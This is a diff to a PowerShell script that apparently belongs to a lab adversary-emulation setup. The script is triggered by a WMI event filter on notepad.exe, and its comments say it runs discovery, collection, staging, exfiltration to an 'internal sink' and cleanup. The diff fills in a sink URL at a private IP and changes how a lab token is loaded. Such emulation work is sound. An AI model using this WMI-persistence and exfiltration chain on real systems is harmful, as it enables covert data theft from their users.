@@ -2,17 +2,12 @@
 # when the NotepadFilter fires on notepad.exe). Runs discovery, collection, staging,
 # archiving, exfiltration to the internal sink and cleanup. Run-scoped config below is
 # injected by install.ps1 at build time.
-$RunId    = "__RUN_ID__"
-$SinkBase = "__SINK_BASE__"
-$VictimHost = "__HOST__"
+$RunId    = "RUN-20261003-04"
+$SinkBase = "http://192.168.106.1:9180"
+$VictimHost = "wmi"
 $SinkToken = $env:SINK_TOKEN
 if (-not $SinkToken) {
-    foreach ($tp in @("$env:TEMP\lab-token.txt", "C:\Windows\Temp\lab-token.txt")) {
-        try {
-            $SinkToken = (Get-Content $tp -Raw -ErrorAction Stop).Trim()
-            if ($SinkToken) { break }
-        } catch {}
-    }
+    try { $SinkToken = (Get-Content "$env:TEMP\lab-token.txt" -Raw -ErrorAction Stop).Trim() } catch {}
 }
 # shared lab credential; the sink rejects uploads without it. The token is NEVER
 # committed: it lives in the guest (env or %TEMP%\lab-token.txt) and in the sink's
